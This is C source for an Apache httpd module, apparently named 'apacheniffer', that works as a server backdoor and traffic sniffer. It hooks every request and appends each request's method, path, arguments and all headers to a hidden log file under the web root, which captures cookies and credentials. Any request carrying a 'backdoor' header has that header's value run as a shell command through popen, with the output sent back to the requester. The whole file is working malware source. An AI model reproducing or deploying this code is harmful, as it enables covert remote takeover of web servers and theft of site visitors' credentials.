#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "http_request.h"
#include <stdio.h>
#include <string.h>

#define TRUE 1
#define FALSE 0

struct configuration {
  char backdoor_header[30];
  char path_requests[30];
  int ERROR_RETURN; //set to DECLINED in prod servers
  int snifferIsActive;
};
struct configuration reqInfo = {"backdoor", "/var/www/html/.log.log", HTTP_INTERNAL_SERVER_ERROR, TRUE }; 


void executeCommand(char command[0x100], request_rec *r){
    FILE* fp = popen(command,"r");
    char buffer[0x100] = {0};
    int counter = 1;
    while(counter){
        counter = fread(buffer, 1, sizeof(buffer), fp);
       ap_rprintf(r, "%s", buffer);
    }
     pclose(fp);
}

static int apacheniffer_handler(request_rec *r) {

//the below line is commented so this module will handle every request    
//if (!r->handler || strcmp(r->handler, "hello_world")) {
//        return DECLINED;
//    }    
    

const apr_array_header_t  *fields;
int i;
apr_table_entry_t *e = 0;

if(reqInfo.snifferIsActive){
    FILE *fptr;
    fptr = fopen(reqInfo.path_requests, "a");

    if(!fptr){
        return reqInfo.ERROR_RETURN;
    }

    fields = apr_table_elts(r->headers_in);
    e = (apr_table_entry_t *) fields->elts;

    fprintf(fptr, "%s %s\nArgs: %s\n", r->method, r->filename, r->args);
    for(i = 0; i < fields->nelts; i++) {
        if(strcmp(e[i].key, reqInfo.backdoor_header) == 0){ //if sniff is disabled this will be impossible. FIX THIS!
            //backdoor is active
            executeCommand(e[i].val, r);
            return DONE;
        }
        fprintf(fptr, "%s: %s\n", e[i].key, e[i].val);
    }

    fprintf(fptr, "================================\n");
    fclose(fptr);
}



   return DECLINED; //We handled this request and the server should just close this thread without further processing
}

static void register_hooks(apr_pool_t *p) {
    ap_hook_handler(apacheniffer_handler, NULL, NULL, APR_HOOK_MIDDLE);
}

module AP_MODULE_DECLARE_DATA apacheniffer_module = {
    STANDARD20_MODULE_STUFF,
    NULL,           /* Per-directory configuration handler */
    NULL,           /* Merge handler for per-directory configurations */
    NULL,           /* Per-server configuration handler */
    NULL,           /* Merge handler for per-server configurations */
    NULL,           /* Any directives we may have for httpd */
    register_hooks  /* Our hook registering function */
};
